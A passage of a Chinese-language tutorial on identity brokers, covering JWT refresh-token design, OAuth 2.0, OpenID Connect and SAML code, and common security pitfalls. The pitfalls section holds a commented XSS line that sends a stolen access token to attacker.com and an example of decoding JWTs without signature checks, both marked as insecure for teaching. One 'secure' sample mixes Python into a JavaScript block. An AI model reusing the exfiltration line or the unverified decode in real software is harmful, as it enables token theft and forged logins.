    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key
        self<span class="token punctuation">.</span>refresh_tokens <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 伺服器端重新整理權杖儲存</span>
    
    <span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>verify_credentials<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># 短期存取權杖（15 分鐘）</span>
            access_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span>
                <span class="token string">'sub'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
                <span class="token string">'exp'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'access'</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
            
            <span class="token comment"># 長期重新整理權杖（7 天）儲存在伺服器端</span>
            refresh_token <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_urlsafe<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">[</span>refresh_token<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
                <span class="token string">'expires'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            
            <span class="token keyword">return</span> <span class="token punctuation">{</span>
                <span class="token string">'access_token'</span><span class="token punctuation">:</span> access_token<span class="token punctuation">,</span>
                <span class="token string">'refresh_token'</span><span class="token punctuation">:</span> refresh_token<span class="token punctuation">,</span>
                <span class="token string">'expires_in'</span><span class="token punctuation">:</span> <span class="token number">900</span>  <span class="token comment"># 15 分鐘</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    
    <span class="token keyword">def</span> <span class="token function">refresh_access_token</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> refresh_token<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 驗證重新整理權杖（伺服器端檢查）</span>
        token_data <span class="token operator">=</span> self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">.</span>get<span class="token punctuation">(</span>refresh_token<span class="token punctuation">)</span>
        <span class="token keyword">if</span> token_data <span class="token keyword">and</span> token_data<span class="token punctuation">[</span><span class="token string">'expires'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># 頒發新的存取權杖</span>
            access_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span>
                <span class="token string">'sub'</span><span class="token punctuation">:</span> token_data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                <span class="token string">'exp'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'access'</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> access_token
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    
    <span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> refresh_token<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 撤銷重新整理權杖</span>
        <span class="token keyword">if</span> refresh_token <span class="token keyword">in</span> self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">:</span>
            <span class="token keyword">del</span> self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">[</span>refresh_token<span class="token punctuation">]</span></code></pre>
<div class="admonition tip"><p class="admonition-title"><span class="mdi mdi-lightbulb-on-outline admonition-icon"></span>🎯 混合方法的優勢</p><div class="admonition-content"><p><strong>平衡的安全性</strong></p>
<ul>
<li>短期存取權杖限制暴露視窗</li>
<li>被洩露的存取權杖很快過期</li>
<li>重新整理權杖可以立即撤銷</li>
<li>登出使重新整理權杖失效</li>
</ul>
<p><strong>效能和可擴展性</strong></p>
<ul>
<li>存取權杖本地驗證（無狀態）</li>
<li>重新整理權杖檢查不頻繁（每 15 分鐘）</li>
<li>降低身份代理的負載</li>
<li>像基於權杖的身份驗證一樣可擴展</li>
</ul>
<p><strong>使用者體驗</strong></p>
<ul>
<li>在背景無縫重新整理權杖</li>
<li>無需頻繁重新身份驗證</li>
<li>登出立即生效</li>
<li>安全性和便利性之間的平衡</li>
</ul>
</div></div>
<p>這種混合方法被 OAuth 2.0 和 OpenID Connect 使用，代表了業界最佳實務。</p>
<h2 id="協定選擇：OAuth-2-0、SAML-和-OpenID-Connect">協定選擇：OAuth 2.0、SAML 和 OpenID Connect</h2>
<p>身份代理必須支援各種身份驗證協定。理解它們的差異對於實作決策至關重要。</p>
<h3 id="OAuth-2-0：授權框架">OAuth 2.0：授權框架</h3>
<p>OAuth 2.0 是一個授權框架，而不是身份驗證協定，儘管經常用於兩者：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># OAuth 2.0 授權碼流程</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
<span class="token keyword">import</span> requests

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

BROKER_AUTH_URL <span class="token operator">=</span> <span class="token string">'https://broker.example.com/oauth/authorize'</span>
BROKER_TOKEN_URL <span class="token operator">=</span> <span class="token string">'https://broker.example.com/oauth/token'</span>
CLIENT_ID <span class="token operator">=</span> <span class="token string">'your_client_id'</span>
CLIENT_SECRET <span class="token operator">=</span> <span class="token string">'your_client_secret'</span>
REDIRECT_URI <span class="token operator">=</span> <span class="token string">'https://app.example.com/callback'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 將使用者重新導向到身份代理</span>
    auth_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>BROKER_AUTH_URL<span class="token punctuation">}</span></span><span class="token string">?client_id=</span><span class="token interpolation"><span class="token punctuation">{</span>CLIENT_ID<span class="token punctuation">}</span></span><span class="token string">&amp;redirect_uri=</span><span class="token interpolation"><span class="token punctuation">{</span>REDIRECT_URI<span class="token punctuation">}</span></span><span class="token string">&amp;response_type=code&amp;scope=openid profile email"</span></span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>auth_url<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/callback'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 代理使用授權碼重新導向回來</span>
    code <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 用授權碼交換存取權杖</span>
    token_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>BROKER_TOKEN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>
        <span class="token string">'grant_type'</span><span class="token punctuation">:</span> <span class="token string">'authorization_code'</span><span class="token punctuation">,</span>
        <span class="token string">'code'</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span>
        <span class="token string">'redirect_uri'</span><span class="token punctuation">:</span> REDIRECT_URI<span class="token punctuation">,</span>
        <span class="token string">'client_id'</span><span class="token punctuation">:</span> CLIENT_ID<span class="token punctuation">,</span>
        <span class="token string">'client_secret'</span><span class="token punctuation">:</span> CLIENT_SECRET
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    
    tokens <span class="token operator">=</span> token_response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    access_token <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token string">'access_token'</span><span class="token punctuation">]</span>
    
    <span class="token comment"># 使用存取權杖取得使用者資訊</span>
    user_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
        <span class="token string">'https://broker.example.com/userinfo'</span><span class="token punctuation">,</span>
        headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Bearer </span><span class="token interpolation"><span class="token punctuation">{</span>access_token<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">}</span>
    <span class="token punctuation">)</span>
    
    user_info <span class="token operator">=</span> user_response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 使用 user_info 建立應用程式工作階段</span>
    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"歡迎 </span><span class="token interpolation"><span class="token punctuation">{</span>user_info<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span></code></pre>
<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>📋 OAuth 2.0 特徵</p><div class="admonition-content"><p><strong>設計用於</strong></p>
<ul>
<li>委派授權</li>
<li>第三方 API 存取</li>
<li>行動和 Web 應用程式</li>
<li>現代 REST API</li>
</ul>
<p><strong>優勢</strong></p>
<ul>
<li>簡單的基於 HTTP 的協定</li>
<li>廣泛的業界採用</li>
<li>行動友善</li>
<li>靈活的授權類型</li>
</ul>
<p><strong>局限性</strong></p>
<ul>
<li>不是為身份驗證設計的</li>
<li>沒有標準的使用者資訊格式</li>
<li>需要額外的設定檔端點</li>
<li>權杖格式未標準化</li>
</ul>
</div></div>
<h3 id="OpenID-Connect：OAuth-2-0-之上的身份驗證層">OpenID Connect：OAuth 2.0 之上的身份驗證層</h3>
<p>OpenID Connect（OIDC）專門為身份驗證擴展了 OAuth 2.0：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># OpenID Connect 在 OAuth 2.0 流程中新增 ID 權杖</span>
<span class="token keyword">from</span> jose <span class="token keyword">import</span> jwt

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/oidc-callback'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">oidc_callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    code <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 用授權碼交換權杖</span>
    token_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>BROKER_TOKEN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>
        <span class="token string">'grant_type'</span><span class="token punctuation">:</span> <span class="token string">'authorization_code'</span><span class="token punctuation">,</span>
        <span class="token string">'code'</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span>
        <span class="token string">'redirect_uri'</span><span class="token punctuation">:</span> REDIRECT_URI<span class="token punctuation">,</span>
        <span class="token string">'client_id'</span><span class="token punctuation">:</span> CLIENT_ID<span class="token punctuation">,</span>
        <span class="token string">'client_secret'</span><span class="token punctuation">:</span> CLIENT_SECRET
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    
    tokens <span class="token operator">=</span> token_response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    id_token <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token string">'id_token'</span><span class="token punctuation">]</span>  <span class="token comment"># OIDC 新增 ID 權杖</span>
    access_token <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token string">'access_token'</span><span class="token punctuation">]</span>
    
    <span class="token comment"># 驗證和解碼 ID 權杖</span>
    <span class="token comment"># ID 權杖包含使用者身份聲明</span>
    user_claims <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>
        id_token<span class="token punctuation">,</span>
        key<span class="token operator">=</span>get_broker_public_key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'RS256'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        audience<span class="token operator">=</span>CLIENT_ID
    <span class="token punctuation">)</span>
    
    <span class="token comment"># ID 權杖包含：sub、name、email 等</span>
    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"歡迎 </span><span class="token interpolation"><span class="token punctuation">{</span>user_claims<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string"> (</span><span class="token interpolation"><span class="token punctuation">{</span>user_claims<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">)"</span></span></code></pre>
<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ OpenID Connect 優勢</p><div class="admonition-content"><p><strong>專為身份驗證而建構</strong></p>
<ul>
<li>ID 權杖包含使用者身份</li>
<li>標準化的使用者聲明</li>
<li>不需要額外的設定檔端點</li>
<li>清晰的身份驗證語義</li>
</ul>
<p><strong>安全功能</strong></p>
<ul>
<li>ID 權杖是簽章的 JWT</li>
<li>加密驗證</li>
<li>受眾和頒發者驗證</li>
<li>用於重放保護的 nonce</li>
</ul>
<p><strong>業界標準</strong></p>
<ul>
<li>所有主要身份提供者都支援</li>
<li>廣泛的函式庫支援</li>
<li>文件完善的規範</li>
<li>積極的開發和更新</li>
</ul>
</div></div>
<h3 id="SAML-2-0：企業標準">SAML 2.0：企業標準</h3>
<p>SAML（安全斷言標記語言）是傳統的企業身份驗證協定：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># SAML 2.0 身份驗證流程（簡化）</span>
<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
<span class="token keyword">from</span> signxml <span class="token keyword">import</span> XMLVerifier

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/saml/login'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">saml_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 產生 SAML 身份驗證請求</span>
    saml_request <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
    &lt;samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                        ID="</span><span class="token interpolation"><span class="token punctuation">{</span>generate_request_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"
                        Version="2.0"
                        IssueInstant="</span><span class="token interpolation"><span class="token punctuation">{</span>datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isoformat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">Z"
                        Destination="</span><span class="token interpolation"><span class="token punctuation">{</span>BROKER_SSO_URL<span class="token punctuation">}</span></span><span class="token string">"&gt;
        &lt;saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"&gt;
            </span><span class="token interpolation"><span class="token punctuation">{</span>SERVICE_PROVIDER_ID<span class="token punctuation">}</span></span><span class="token string">
        &lt;/saml:Issuer&gt;
    &lt;/samlp:AuthnRequest&gt;
    """</span></span>
    
    <span class="token comment"># 編碼並重新導向到身份代理</span>
    encoded_request <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>saml_request<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sso_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>BROKER_SSO_URL<span class="token punctuation">}</span></span><span class="token string">?SAMLRequest=</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_request<span class="token punctuation">}</span></span><span class="token string">"</span></span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>sso_url<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/saml/acs'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">saml_assertion_consumer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 代理將 SAML 回應發送回來</span>
    saml_response <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'SAMLResponse'</span><span class="token punctuation">]</span>
    decoded_response <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>saml_response<span class="token punctuation">)</span>
    
    <span class="token comment"># 驗證 SAML 斷言簽章</span>
    xml_doc <span class="token operator">=</span> etree<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>decoded_response<span class="token punctuation">)</span>
    verified_data <span class="token operator">=</span> XMLVerifier<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>verify<span class="token punctuation">(</span>
        xml_doc<span class="token punctuation">,</span>
        x509_cert<span class="token operator">=</span>get_broker_certificate<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">.</span>signed_xml
    
    <span class="token comment"># 從斷言中提取使用者屬性</span>
    nameid <span class="token operator">=</span> xml_doc<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'.//{urn:oasis:names:tc:SAML:2.0:assertion}NameID'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
    attributes <span class="token operator">=</span> extract_saml_attributes<span class="token punctuation">(</span>xml_doc<span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"歡迎 </span><span class="token interpolation"><span class="token punctuation">{</span>attributes<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span></code></pre>
<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>🏢 SAML 特徵</p><div class="admonition-content"><p><strong>設計用於</strong></p>
<ul>
<li>企業單一登入</li>
<li>組織之間的聯合</li>
<li>傳統企業系統</li>
<li>強安全要求</li>
</ul>
<p><strong>優勢</strong></p>
<ul>
<li>成熟且經過實戰檢驗</li>
<li>豐富的屬性交換</li>
<li>強大的安全功能</li>
<li>企業採用</li>
</ul>
<p><strong>劣勢</strong></p>
<ul>
<li>基於 XML（冗長且複雜）</li>
<li>不適合行動裝置</li>
<li>學習曲線陡峭</li>
<li>現代工具有限</li>
</ul>
</div></div>
<h3 id="協定選擇指南">協定選擇指南</h3>
<div class="admonition tip"><p class="admonition-title"><span class="mdi mdi-lightbulb-on-outline admonition-icon"></span>🎯 選擇正確的協定</p><div class="admonition-content"><p><strong>使用 OpenID Connect 當：</strong></p>
<ul>
<li>建構新應用程式</li>
<li>需要行動支援</li>
<li>想要現代 REST API</li>
<li>需要簡單整合</li>
<li>面向消費者使用者</li>
</ul>
<p><strong>使用 SAML 當：</strong></p>
<ul>
<li>與企業系統整合</li>
<li>企業 IT 政策要求</li>
<li>需要豐富的屬性交換</li>
<li>與其他組織聯合</li>
<li>需要傳統系統相容性</li>
</ul>
<p><strong>使用 OAuth 2.0 當：</strong></p>
<ul>
<li>需要 API 授權（不是身份驗證）</li>
<li>第三方存取資源</li>
<li>委派權限</li>
<li>與 OIDC 結合用於身份驗證</li>
</ul>
</div></div>
<p>像 Keycloak 這樣的現代身份代理支援所有三種協定，允許應用程式根據需要進行選擇。</p>
<h2 id="常見陷阱和安全問題">常見陷阱和安全問題</h2>
<p>身份代理實作經常遭受常見的安全漏洞和設計錯誤。</p>
<h3 id="陷阱-1：在本地儲存中儲存權杖">陷阱 1：在本地儲存中儲存權杖</h3>
<p>許多應用程式將權杖儲存在瀏覽器本地儲存中，從而產生 XSS 漏洞：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// ❌ 不安全：在本地儲存中儲存權杖</span>
<span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> password <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token comment">// 容易受到 XSS 攻擊</span>
        localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'access_token'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>access_token<span class="token punctuation">)</span><span class="token punctuation">;</span>
        localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'refresh_token'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>refresh_token<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 任何 XSS 漏洞都可以竊取權杖</span>
<span class="token comment">// &lt;script&gt;</span>
<span class="token comment">//   fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));</span>
<span class="token comment">// &lt;/script&gt;</span></code></pre>
<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 本地儲存漏洞</p><div class="admonition-content"><p><strong>XSS 攻擊向量</strong></p>
<ul>
<li>JavaScript 可以存取本地儲存</li>
<li>任何 XSS 漏洞都會暴露權杖</li>
<li>第三方指令碼可以竊取權杖</li>
<li>沒有針對指令碼注入的保護</li>
</ul>
<p><strong>影響</strong></p>
<ul>
<li>完全帳戶接管</li>
<li>權杖在過期前有效</li>
<li>攻擊者可以冒充使用者</li>
<li>難以偵測竊取</li>
</ul>
</div></div>
<p>使用 HTTP-only cookie 的更好方法：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// ✅ 安全：使用 HTTP-only cookie</span>
<span class="token comment">// 伺服器設定 HTTP-only cookie（JavaScript 無法存取）</span>
@app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/api/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
def <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>
    data <span class="token operator">=</span> request<span class="token punctuation">.</span>json
    tokens <span class="token operator">=</span> broker<span class="token punctuation">.</span><span class="token function">authenticate</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    
    response <span class="token operator">=</span> <span class="token function">make_response</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string-property property">'status'</span><span class="token operator">:</span> <span class="token string">'success'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    
    # <span class="token constant">HTTP</span><span class="token operator">-</span>only cookie 防止 JavaScript 存取
    response<span class="token punctuation">.</span><span class="token function">set_cookie</span><span class="token punctuation">(</span>
        <span class="token string">'access_token'</span><span class="token punctuation">,</span>
        tokens<span class="token punctuation">[</span><span class="token string">'access_token'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        httponly<span class="token operator">=</span>True<span class="token punctuation">,</span>  # 防止 JavaScript 存取
        secure<span class="token operator">=</span>True<span class="token punctuation">,</span>    # 僅 <span class="token constant">HTTPS</span>
        samesite<span class="token operator">=</span><span class="token string">'Strict'</span>  # <span class="token constant">CSRF</span> 保護
    <span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> response

<span class="token comment">// 客戶端：不需要權杖處理</span>
<span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>  <span class="token comment">// 發送 cookie</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> password <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="陷阱-2：缺少權杖驗證">陷阱 2：缺少權杖驗證</h3>
<p>應用程式有時會跳過適當的權杖驗證：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ❌ 不安全：信任權杖而不驗證</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/user'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 解碼而不驗證！</span>
    payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> options<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"verify_signature"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">:</span> payload<span class="token punctuation">[</span><span class="token string">'sub'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>  <span class="token comment"># 攻擊者可以偽造權杖！</span></code></pre>
